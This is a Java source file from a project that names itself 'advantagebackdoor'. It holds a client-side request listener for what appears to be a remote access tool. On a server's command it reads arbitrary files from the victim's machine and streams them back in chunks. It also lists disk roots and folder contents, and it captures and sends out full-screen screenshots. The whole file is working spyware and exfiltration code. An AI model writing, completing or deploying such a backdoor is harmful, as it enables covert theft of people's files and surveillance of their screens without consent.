package me.faintcloudy.advantagebackdoor.client.message;

import me.faintcloudy.advantagebackdoor.api.message.play.client.ClientFileMessage;
import me.faintcloudy.advantagebackdoor.api.message.play.client.DirectoryMessage;
import me.faintcloudy.advantagebackdoor.api.message.play.server.ClientFileRequestMessage;
import me.faintcloudy.advantagebackdoor.api.message.play.server.DirectoryRequestMessage;
import org.apache.commons.io.IOUtils;
import me.faintcloudy.advantagebackdoor.api.message.MessageHandler;
import me.faintcloudy.advantagebackdoor.api.message.MessageListener;
import me.faintcloudy.advantagebackdoor.api.message.play.client.FallbackMessage;
import me.faintcloudy.advantagebackdoor.api.message.play.client.ScreenShotMessage;
import me.faintcloudy.advantagebackdoor.api.message.play.server.RequestMessage;
import me.faintcloudy.advantagebackdoor.client.Log4jClient;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Objects;
import java.util.UUID;

public class RequestListener implements MessageListener {
    @MessageHandler
    public void onClientFileRequest(ClientFileRequestMessage message)
    {
        try {
            File file = new File(message.file);
            if (!file.exists())
            {
                Log4jClient.getInstance().sendMessage(new FallbackMessage("There isn't a file named '" + message.file + "'"));
                return;
            }
            if (file.isDirectory())
            {
                Log4jClient.getInstance().sendMessage(new FallbackMessage("The folder '" + message.file + "' isn't a file"));
                return;
            }
            byte[] wholeBytes = IOUtils.toByteArray(new FileInputStream(file));
            new Thread(() -> {
                UUID uuid = UUID.randomUUID();
                int i = 0;
                for (;i<wholeBytes.length;i+=40000)
                {
                    try {
                        Thread.sleep(100);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                    boolean end = i + 40000 >= wholeBytes.length;
                    byte[] bytes = end ? Arrays.copyOfRange(wholeBytes, i, wholeBytes.length) : Arrays.copyOfRange(wholeBytes, i, i + 40000);
                    ClientFileMessage clientFileMessage = new ClientFileMessage(bytes, uuid, end, message.file);
                    Log4jClient.getInstance().sendMessage(clientFileMessage);
                }
            }).start();

        } catch (Exception e) {
            Log4jClient.getInstance().sendMessage(new FallbackMessage("Error in sending ClientFileMessage: " + e.getMessage()));
        }
    }

    @MessageHandler
    public void onDirectoryRequest(DirectoryRequestMessage message)
    {
        if (message.path.equalsIgnoreCase("disk"))
        {
            List<String> disks = new ArrayList<>();
            for (File root : File.listRoots()) {
                disks.add(root.getAbsolutePath());
            }
            Log4jClient.getInstance().sendMessage(new DirectoryMessage(new ArrayList<>(), disks, message.path));
        } else {
            List<String> files = new ArrayList<>();
            List<String> folders = new ArrayList<>();
            try {
                File file = new File(message.path);
                if (!file.exists())
                {
                    Log4jClient.getInstance().sendMessage(new FallbackMessage("There isn't a directory named '" + message.path + "'"));
                    return;
                }
                if (file.isFile())
                {
                    Log4jClient.getInstance().sendMessage(new FallbackMessage("The file '" + message.path + "' isn't a folder"));
                    return;
                }
                for (File listFile : Objects.requireNonNull(file.listFiles())) {
                    if (listFile.isFile())
                        files.add(listFile.getName());
                    else
                        folders.add(listFile.getName());
                }
            } catch (Exception e) {
                Log4jClient.getInstance().sendMessage(new FallbackMessage("Error in sending DirectoryMessage: " + e.getMessage()));
                return;
            }
            Log4jClient.getInstance().sendMessage(new DirectoryMessage(files, folders, message.path));

        }
    }

    @MessageHandler
    public void onScreenSlotRequest(RequestMessage message)
    {
        if (!Objects.equals(message.requestMessageClass.getName(), ScreenShotMessage.class.getName()))
            return;
        Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
        System.out.println("The width and the height of the screen are " + screenSize.getWidth() + " x " + screenSize.getHeight());
        BufferedImage image = null;
        try {
            image = new Robot().createScreenCapture(new Rectangle(screenSize));
        } catch (AWTException e) {
            e.printStackTrace();
        }
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        try {
            ImageIO.write(image, "png", out);
        } catch (IOException e) {
            e.printStackTrace();
        }

        new Thread(() -> {
            UUID uuid = UUID.randomUUID();
            byte[] wholeBytes = out.toByteArray();
            int i = 0;
            for (;i<wholeBytes.length;i+=40000)
            {
                try {
                    Thread.sleep(100);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                boolean end = i + 40000 >= wholeBytes.length;
                byte[] bytes = end ? Arrays.copyOfRange(wholeBytes, i, wholeBytes.length) : Arrays.copyOfRange(wholeBytes, i, i + 40000);
                ScreenShotMessage screenShotMessage = new ScreenShotMessage(bytes, uuid, end);
                Log4jClient.getInstance().sendMessage(screenShotMessage);
            }
        }).start();



    }
}
